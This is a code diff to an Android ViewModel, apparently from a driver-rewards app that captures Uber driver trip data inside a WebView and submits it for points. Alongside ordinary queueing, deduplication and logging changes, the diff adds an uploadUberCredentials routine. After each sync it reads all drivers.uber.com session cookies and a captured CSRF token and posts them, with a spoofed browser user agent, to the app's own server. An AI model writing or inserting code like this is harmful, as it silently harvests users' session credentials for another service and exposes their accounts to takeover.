@@ -1,8 +1,11 @@
 package com.driversreward.app.ui.screens
 
+import android.util.Log
+import android.webkit.CookieManager
 import androidx.lifecycle.ViewModel
 import androidx.lifecycle.viewModelScope
-import com.driversreward.app.data.api.TripPayload
+import com.driversreward.app.data.api.RawTripItem
+import com.driversreward.app.data.api.RewardsApi
 import com.driversreward.app.data.repository.AuthRepository
 import com.driversreward.app.data.repository.TripRepository
 import dagger.hilt.android.lifecycle.HiltViewModel
@@ -12,8 +15,9 @@ import kotlinx.coroutines.flow.asStateFlow
 import kotlinx.coroutines.flow.update
 import kotlinx.coroutines.launch
 import org.json.JSONObject
-import java.security.MessageDigest
 import javax.inject.Inject
+
+private const val TAG = "DriversReward"
 
 data class WebViewUiState(
     val isLoading: Boolean = false,
@@ -32,29 +36,53 @@ data class WebViewUiState(
 @HiltViewModel
 class WebViewViewModel @Inject constructor(
     private val tripRepository: TripRepository,
-    private val authRepository: AuthRepository
+    private val authRepository: AuthRepository,
+    private val api: RewardsApi
 ) : ViewModel() {
 
     private val _uiState = MutableStateFlow(WebViewUiState())
     val uiState: StateFlow<WebViewUiState> = _uiState.asStateFlow()
 
-    private val pendingTrips = mutableListOf<TripPayload>()
-    private val processedUuids = mutableSetOf<String>()
+    private val rawTripQueue = mutableListOf<RawTripItem>()
+    private val seenUrls = mutableSetOf<String>()
+    private val submittedFeedKeys = mutableSetOf<String>()
+    private var capturedCsrfToken: String? = null
 
-    fun onTripCaptured(rawJson: String) {
+    fun onTripCaptured(rawBody: String, url: String) {
         viewModelScope.launch {
             try {
-                val trip = parseTripResponse(rawJson) ?: return@launch
-                if (processedUuids.contains(trip.tripUuid)) return@launch
+                if (rawBody.length < 50) {
+                    Log.d(TAG, "onTripCaptured: body too short (${rawBody.length}), skipping")
+                    return@launch
+                }
 
-                processedUuids.add(trip.tripUuid)
-                pendingTrips.add(trip)
+                val peek = try { JSONObject(rawBody) } catch (_: Exception) {
+                    Log.w(TAG, "onTripCaptured: not valid JSON, skipping")
+                    return@launch
+                }
+                if (peek.optString("status") == "failure") {
+                    Log.d(TAG, "onTripCaptured: Uber error response, skipping")
+                    return@launch
+                }
 
-                if (pendingTrips.size >= 5) {
-                    flushTrips()
+                val tripUuid = extractUuidFromUrl(url)
+                    .ifEmpty { peek.optJSONObject("data")?.optString("uuid", "") ?: peek.optString("uuid", "") }
+
+                val dedupeKey = tripUuid.ifEmpty { url }
+                if (dedupeKey.isNotEmpty() && seenUrls.contains(dedupeKey)) {
+                    Log.d(TAG, "onTripCaptured: duplicate $dedupeKey, skipping")
+                    return@launch
+                }
+                if (dedupeKey.isNotEmpty()) seenUrls.add(dedupeKey)
+
+                rawTripQueue.add(RawTripItem(rawBody = rawBody, tripUuid = tripUuid, url = url))
+                Log.d(TAG, "onTripCaptured: queued trip $tripUuid (queue=${rawTripQueue.size}, body=${rawBody.length} bytes)")
+
+                if (rawTripQueue.size >= 20) {
+                    flushRawTrips()
                 }
             } catch (e: Exception) {
-                _uiState.update { it.copy(error = "Failed to parse trip: ${e.message}") }
+                Log.e(TAG, "onTripCaptured error: ${e.message}")
             }
         }
     }
@@ -62,6 +90,16 @@ class WebViewViewModel @Inject constructor(
     fun onActivityFeedCaptured(rawJson: String) {
         viewModelScope.launch {
             try {
+                val peek = JSONObject(rawJson)
+                val data = peek.optJSONObject("data")
+                val start = data?.optString("startDateIso", "") ?: ""
+                val end = data?.optString("endDateIso", "") ?: ""
+                val key = "$start|$end"
+                if (key != "|" && submittedFeedKeys.contains(key)) {
+                    Log.d(TAG, "onActivityFeedCaptured: already submitted $key, skipping")
+                    return@launch
+                }
+                if (key != "|") submittedFeedKeys.add(key)
                 tripRepository.submitActivityFeed(rawJson)
             } catch (_: Exception) { }
         }
@@ -83,108 +121,97 @@ class WebViewViewModel @Inject constructor(
         }
     }
 
+    fun onCsrfCaptured(csrfToken: String) {
+        if (csrfToken.isNotEmpty()) {
+            capturedCsrfToken = csrfToken
+            viewModelScope.launch { uploadUberCredentials() }
+        }
+    }
+
     fun onAutoFetchComplete() {
-        viewModelScope.launch { 
-            flushTrips() 
+        viewModelScope.launch {
+            Log.d(TAG, "onAutoFetchComplete: flushing ${rawTripQueue.size} queued trips")
+            flushRawTrips()
             _uiState.update { it.copy(isSyncing = false, syncMessage = "Sync complete!") }
+            uploadUberCredentials()
         }
     }
 
-    private suspend fun flushTrips() {
-        if (pendingTrips.isEmpty()) return
-
-        val batch = pendingTrips.toList()
-        pendingTrips.clear()
-
+    private suspend fun uploadUberCredentials() {
+        val csrf = capturedCsrfToken ?: return
         try {
-            val result = tripRepository.submitTrips(batch)
-            _uiState.update {
-                it.copy(
-                    pointsEarned = it.pointsEarned + (result?.totalPointsAwarded ?: 0),
-                    tripsProcessed = it.tripsProcessed + (result?.newTrips ?: 0)
-                )
+            val cookies = CookieManager.getInstance().getCookie("https://drivers.uber.com")
+            if (cookies.isNullOrEmpty()) {
+                Log.w(TAG, "uploadCred: no cookies found")
+                return
             }
+            val token = authRepository.getAccessToken() ?: run {
+                Log.w(TAG, "uploadCred: no access token")
+                return
+            }
+            val body = mapOf(
+                "cookies" to cookies,
+                "csrfToken" to csrf,
+                "userAgent" to "Mozilla/5.0 (Linux; Android) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36",
+                "source" to "android_app"
+            )
+            val res = api.storeCredential("Bearer $token", body)
+            Log.d(TAG, "uploadCred: ${res.code()} ${if (res.isSuccessful) "OK" else res.errorBody()?.string()?.take(100)}")
         } catch (e: Exception) {
-            pendingTrips.addAll(0, batch)
-            _uiState.update { it.copy(error = "Sync failed: ${e.message}") }
+            Log.e(TAG, "uploadCred failed: ${e.message}")
         }
     }
 
-    private fun parseTripResponse(rawJson: String): TripPayload? {
-        val root = JSONObject(rawJson)
+    private suspend fun flushRawTrips() {
+        if (rawTripQueue.isEmpty()) {
+            Log.d(TAG, "flushRawTrips: queue empty, nothing to flush")
+            return
+        }
 
-        val uuid = root.optString("uuid", "") .ifEmpty { return null }
-        val requestedAt = root.optLong("requestedAt", System.currentTimeMillis() / 1000)
+        val totalCreated = mutableListOf<Int>()
+        val totalPoints = mutableListOf<Int>()
 
-        val cards = root.optJSONArray("cards") ?: return null
+        while (rawTripQueue.isNotEmpty()) {
+            val batch = rawTripQueue.take(20)
+            Log.d(TAG, "flushRawTrips: sending batch of ${batch.size} (${rawTripQueue.size} total)")
 
-        var vehicleType: String? = null
-        var fareAmount = 0.0
-        var serviceFee = 0.0
-        var bookingFee = 0.0
-        var netEarnings = 0.0
-        var tips = 0.0
-        var currency = "USD"
-
-        for (i in 0 until cards.length()) {
-            val card = cards.getJSONObject(i)
-            when (card.optString("type")) {
-                "TripSummaryCard" -> {
-                    val hero = card.optJSONObject("hero")
-                    vehicleType = hero?.optString("subtitle")
+            try {
+                val result = tripRepository.submitRawTrips(batch)
+                if (result != null) {
+                    rawTripQueue.subList(0, batch.size).clear()
+                    totalCreated.add(result.created)
+                    totalPoints.add(result.totalPointsAwarded)
+                    Log.d(TAG, "flushRawTrips: batch done — created=${result.created}, dupes=${result.duplicates}, errors=${result.errors}, pts=${result.totalPointsAwarded}")
+                } else {
+                    Log.e(TAG, "flushRawTrips: null response, stopping flush")
+                    _uiState.update { it.copy(error = "Server returned an error during sync") }
+                    break
                 }
-                "TripBreakdownCardV2", "TripBreakdownCard" -> {
-                    val items = card.optJSONArray("items") ?: continue
-                    for (j in 0 until items.length()) {
-                        val item = items.getJSONObject(j)
-                        val label = item.optString("label", "").lowercase()
-                        val amount = item.optString("amount", "0")
-                        val parsed = amount.replace(Regex("[^0-9.-]"), "")
-                            .toDoubleOrNull() ?: 0.0
-
-                        when {
-                            "your earnings" in label || "total" in label -> netEarnings = parsed
-                            label.trim() == "fare" -> fareAmount = parsed
-                            "service fee" in label -> serviceFee = kotlin.math.abs(parsed)
-                            "booking fee" in label -> bookingFee = kotlin.math.abs(parsed)
-                            "tip" in label -> tips = parsed
-                        }
-
-                        if ("HK$" in amount || "HKD" in amount) currency = "HKD"
-                        else if ("R$" in amount || "BRL" in amount) currency = "BRL"
-                    }
-                }
+            } catch (e: Exception) {
+                Log.e(TAG, "flushRawTrips: exception: ${e.message}")
+                _uiState.update { it.copy(error = "Sync failed: ${e.message}") }
+                break
             }
         }
 
-        return TripPayload(
-            tripUuid = uuid,
-            vehicleType = vehicleType,
-            requestedAt = requestedAt,
-            durationSeconds = null,
-            distanceMeters = null,
-            pickupDistrict = null,
-            dropoffDistrict = null,
-            currency = currency,
-            fareAmount = fareAmount,
-            serviceFee = serviceFee,
-            bookingFee = bookingFee,
-            tips = tips,
-            netEarnings = netEarnings,
-            isPoolType = root.optBoolean("isPoolType", false),
-            isSurge = root.optBoolean("isSurge", false),
-            rawPayloadHash = sha256(rawJson)
-        )
+        val created = totalCreated.sum()
+        val points = totalPoints.sum()
+        _uiState.update {
+            it.copy(
+                pointsEarned = it.pointsEarned + points,
+                tripsProcessed = it.tripsProcessed + created
+            )
+        }
+        Log.d(TAG, "flushRawTrips complete: created=$created, points=$points")
     }
 
-    private fun sha256(input: String): String {
-        val digest = MessageDigest.getInstance("SHA-256")
-        val hash = digest.digest(input.toByteArray(Charsets.UTF_8))
-        return hash.joinToString("") { "%02x".format(it) }
+    private fun extractUuidFromUrl(url: String): String {
+        val match = Regex("[?&]uuid=([^&]+)").find(url) ?: return ""
+        return match.groupValues[1]
     }
 
     override fun onCleared() {
         super.onCleared()
-        viewModelScope.launch { flushTrips() }
+        viewModelScope.launch { flushRawTrips() }
     }
 }
